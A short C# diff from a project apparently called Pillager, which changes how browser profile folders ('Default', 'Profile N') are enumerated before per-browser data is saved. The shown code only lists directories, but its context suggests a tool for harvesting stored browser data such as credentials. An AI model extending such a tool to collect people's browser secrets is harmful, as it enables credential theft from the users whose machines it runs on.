@@ -1,6 +1,7 @@
 ﻿using System;
 using System.Collections.Generic;
 using System.IO;
+using System.Linq;
 using System.Security.Cryptography;
 using System.Text;
 using Pillager.Helper;
@@ -229,11 +230,13 @@ namespace Pillager.Browsers
                     {
                         "Default"
                     };
-                    int i = 1;
-                    while (Directory.Exists(Path.Combine(BrowserPath, "Profile "+i)))
+                    List<string> dirs = Directory.GetDirectories(BrowserPath).ToList();
+                    for (int i = 1; i < 100; i++)
                     {
-                        profileslist.Add("Profile " + i);
-                        i++;
+                        if (dirs.Contains(Path.Combine(BrowserPath, "Profile " + i)))
+                        {
+                            profileslist.Add("Profile " + i);
+                        }
                     }
                     profiles = profileslist.ToArray();
                     string savepath = Path.Combine(path, BrowserName);
